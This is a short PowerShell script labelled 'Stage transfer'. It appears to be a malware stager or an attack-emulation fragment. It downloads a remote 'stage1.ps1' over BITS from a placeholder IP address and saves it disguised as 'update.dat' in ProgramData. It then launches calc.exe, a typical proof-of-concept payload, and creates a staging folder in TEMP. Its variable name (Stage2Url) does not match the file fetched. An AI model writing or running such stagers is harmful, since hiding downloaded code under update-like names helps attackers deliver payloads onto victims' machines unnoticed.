
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://192.0.2.195:443/stage1.ps1",
    [string]$DownloadPath = "C:\ProgramData\update.dat",
    [int]$ConnectionTimeout = 32
)
Start-BitsTransfer -Source $Stage2Url -Destination $DownloadPath
Start-Process -FilePath "calc.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
